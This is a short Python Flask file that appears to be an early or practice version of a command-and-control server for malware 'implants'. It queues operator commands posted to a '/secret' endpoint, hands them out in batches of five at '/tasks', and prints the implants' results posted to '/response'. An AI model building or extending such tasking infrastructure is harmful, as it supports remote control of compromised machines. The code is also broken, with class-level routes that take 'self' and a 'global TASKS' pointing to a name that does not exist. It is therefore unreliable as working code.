from flask import Flask, request, jsonify
import multiprocessing as mp


class trialserver:
    lock = mp.Lock()
    
    implant_lock = mp.Lock()
    # my task queue!
    TASKS = []
    IMPLANTS = []
    
    app = Flask(__name__)
    
    def __init__(self):
        self.blah = "blah"
        return
    
    @app.route("/hello")
    def  hello():
        return "Hello world!"
    
    
    @app.route("/tasks", methods=["GET"])
    def download_tasks(self):
        global TASKS
        self.lock.acquire()
        try:
            # get at most 5 jobs at once
            task_batch = TASKS[:5]
            batch = "\n".join(task_batch )
            TASKS = TASKS[5:]
        finally:
            self.lock.release()
        print("Implant pulled down the following tasks ", task_batch)
        return batch 
    
    @app.route("/response", methods=["POST"])
    def print_response(self):
        print(request.data.decode())
        return ""
    
    
    @app.route("/queue")
    def print_queue(self):
        return  jsonify(TASKS)
    
    
    @app.route("/secret", methods=["POST"])
    def add_request(self):
        r = request.json
        
        self.lock.acquire()
        try:
       
            for cmd in r:
                TASKS.append(cmd)
        finally:
            self.lock.release()
    
        print("Queued up ", r)
        return "True"

    def getapp(self):
        return self.app